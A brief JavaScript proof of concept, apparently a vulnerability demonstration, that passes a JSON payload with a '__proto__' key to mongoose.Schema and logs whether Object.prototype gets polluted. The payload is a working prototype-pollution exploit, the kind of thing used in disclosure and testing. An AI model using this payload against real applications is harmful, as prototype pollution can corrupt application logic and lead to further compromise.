mongoose = require("mongoose");
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log("Before:", {}.polluted);
mongoose.Schema(JSON.parse(malicious_payload));
console.log("After:", {}.polluted);
